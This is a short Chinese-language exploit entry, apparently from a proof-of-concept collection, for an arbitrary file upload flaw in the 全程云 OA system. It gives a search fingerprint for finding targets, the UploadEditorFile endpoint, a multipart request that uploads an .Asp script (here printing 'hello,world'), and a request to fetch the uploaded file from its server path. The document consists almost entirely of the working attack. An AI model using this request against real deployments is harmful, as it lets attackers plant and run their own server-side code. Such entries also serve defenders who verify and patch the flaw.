# 全程云OAUploadEditorFile存在任意文件上传漏洞

- **系统**：全程云　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`product="全程云-管理系统"`
- **请求**：`POST /OA/api/2.0/Common/AttachFile/UploadEditorFile HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNe8DcVuv…`　`Content-Length: 191`

**请求体 / payload**
```
------WebKitFormBoundaryNe8DcVuv1vEUWDaR
Content-Disposition: form-data; name="upload";filename="test.Asp"
<% response.write("hello,world") %>
------WebKitFormBoundaryNe8DcVuv1vEUWDaR--
GET /OA/upfiles/ArtEditor/20260403/bb2a84d8-7486-44e7-bc26-988d3ebb57ad.Asp HTTP/1.1
Host:
projectType: 4
response-lang: chinese
Api-Version: 2.0.0
```
- **预期**：200　|　—